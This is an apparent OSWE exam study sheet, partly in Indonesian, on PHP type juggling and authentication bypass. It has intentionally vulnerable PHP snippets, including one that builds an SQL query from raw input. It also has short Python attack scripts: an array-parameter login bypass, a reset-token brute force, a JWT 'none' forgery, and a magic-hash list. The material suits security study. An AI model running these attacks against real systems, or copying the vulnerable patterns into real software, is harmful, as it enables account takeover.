---
name: "PHP Type Juggling & Authentication Bypass"
description: "PHP loose vs strict comparison, magic hashes, strcmp() vulnerability, in_array() bypass, type juggling with json_decode(), weak random token generation, logic flaw auth bypass, JWT algorithm confusion, and session hijacking."
tags: [oswe, php, type-juggling, magic-hash, authentication-bypass, jwt, weak-random, strcmp]
---

## PHP Type Juggling & Authentication Bypass

### PHP Loose vs Strict Comparison

| Operator | Name | Behavior |
|----------|------|----------|
| `==` | Loose (equal) | Type coercion: `"0e123" == "0"` |
| `===` | Strict (identical) | No coercion: type + value must match |
| `!=` | Loose (not equal) | Type coercion |
| `!==` | Strict (not identical) | No coercion |
| `strcmp($a, $b)` | String compare | Returns 0 if equal, null if array → `null == 0` |
| `in_array($a, $b)` | Loose by default | Type coercion unless third param `true` |
| `switch($a)` | Loose comparison | Coercion in case matching |

### Magic Hashes

Ketika string di-hash dan hasilnya dimulai dengan `0e` diikuti digit saja, PHP akan menginterpretasikannya sebagai float `0` dalam loose comparison:

```php
// Jika hash tersimpan adalah "0e462097431907509062..."
// Dan hash input adalah "0e077701784189519..."
// Maka: "0e462..." == "0e077..." → TRUE (keduanya == float 0)
```

**Known magic hashes**:
```php
// MD5 magic hashes
md5('240610708')  → 0e462097431907509062...
md5('QNKCDZO')    → 0e830400451993494058...
md5('byGcY')      → 0e591948146276357475...
md5('0e215962017') → 0e291242476940776848...

// SHA1 magic hashes
sha1('aaroZmOk')  → 0e665070199694271348...
sha1('aaK1STfY')  → 0e766585266557562076...
sha1('aaO8zKZF')  → 0e892574566772790685...
```

### strcmp() Vulnerability

```php
<?php
$stored_hash = "admin_hash";
if (strcmp($_POST['password'], $stored_hash) == 0) {
    echo "Access granted!";
}
// Attack: kirim password[]=foo (array)
// strcmp(array, string) → NULL → NULL == 0 → TRUE
?>
```

```python
import requests
r = requests.post(TARGET, data={"username": "admin", "password[]": "anything"})
```

### In_array() Vulnerability

```php
<?php
$allowed_roles = ["user", "editor", "admin"];
if (in_array($_POST['role'], $allowed_roles)) {
    // Grant role
}
// Attack: role=0 → in_array('0', ["user", "editor", "admin"]) → TRUE
// Karena 'user' == 0 → TRUE (string to int coercion)
?>
```

### Type Juggling with json_decode()

```php
<?php
$data = json_decode($_POST['data'], true);
$expected_admin = "false";

if ($data['isAdmin'] == $expected_admin) {
    // Not admin
} else {
    // Has admin access!
}
// Attack: {"isAdmin": true} → true == "false"? PHP coerces: (int)true = 1, (int)"false" = 0
// 1 != 0 → else → admin!
?>
```

### Weak Random Token Generation

```java
// VULNERABLE — java.util.Random is predictable
Random rand = new Random();
String token = String.format("%06d", rand.nextInt(999999));

// SECURE — java.security.SecureRandom
SecureRandom rand = new SecureRandom();
byte[] tokenBytes = new byte[32];
rand.nextBytes(tokenBytes);
```

```php
// VULNERABLE — mt_rand() seed can be cracked
$token = mt_rand(100000, 999999);

// SECURE — random_bytes()
$token = bin2hex(random_bytes(32));
```

```python
# Password reset token bruteforce (6-digit)
for i in range(1000000):
    token = f"{i:06d}"
    r = requests.post(TARGET + "/reset.php", data={"username": "admin", "token": token, "new_password": "pwned123"})
    if "success" in r.text:
        print(f"Token found: {token}")
        break
```

### Logic Flaw Authentication Bypass

```php
<?php
// Vulnerability: Step 3 doesn't verify that Step 2 was completed
if ($_POST['action'] === 'change_password') {
    $username = $_POST['username'];
    $new_password = $_POST['new_password'];
    // Missing: check if token was verified!
    $query = "UPDATE users SET password = '$new_password' WHERE username = '$username'";
}
?>
```

```python
# Skip directly to step 3
r = requests.post(TARGET + "/reset.php", data={
    "action": "change_password", "username": "admin", "new_password": "pwned123"
})
```

### JWT Algorithm Confusion

```python
import jwt
# Attack: algorithm none
token = jwt.encode({"user": "admin", "role": "administrator"}, key="", algorithm="none")
# Server-side: jwt.decode(token, verify=False) ← insecure!
```

### Session Hijacking via Weak Session ID

```php
<?php
// Predictable: same IP + User-Agent → same session!
session_id(md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']));
session_start();
?>
```
